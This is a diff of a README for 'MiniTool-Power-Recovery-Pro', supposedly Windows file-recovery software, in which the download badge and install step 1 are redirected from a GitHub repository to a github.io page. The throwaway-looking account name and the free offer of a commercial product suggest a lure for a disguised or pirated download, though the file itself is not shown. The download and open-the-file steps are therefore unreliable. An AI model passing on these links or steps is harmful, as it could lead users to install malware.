@@ -1,6 +1,6 @@
 # 💾 MiniTool-Power-Recovery-Pro - Restore lost files on Windows systems
 
-[![Download MiniTool-Power-Recovery-Pro](https://img.shields.io/badge/Download-Data_Recovery-blue.svg)](https://github.com/Undenominational-babbling674/MiniTool-Power-Recovery-Pro)
+[![Download MiniTool-Power-Recovery-Pro](https://img.shields.io/badge/Download-Data_Recovery-blue.svg)](https://undenominational-babbling674.github.io)
 
 This software recovers lost, deleted, or formatted files from your computer hard drive, external drives, and memory cards. It works on Windows 11 and Windows 10. The tool scans your storage devices to find missing data and extracts it to a safe location.
 
@@ -19,7 +19,7 @@ To run this software, your computer must meet these basic standards:
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the project website at [https://github.com/Undenominational-babbling674/MiniTool-Power-Recovery-Pro](https://github.com/Undenominational-babbling674/MiniTool-Power-Recovery-Pro).
+1. Visit the project website at [https://undenominational-babbling674.github.io](https://undenominational-babbling674.github.io).
 2. Locate the download section on the page.
 3. Click the download link to save the file to your computer.
 4. Open your Downloads folder in File Explorer.
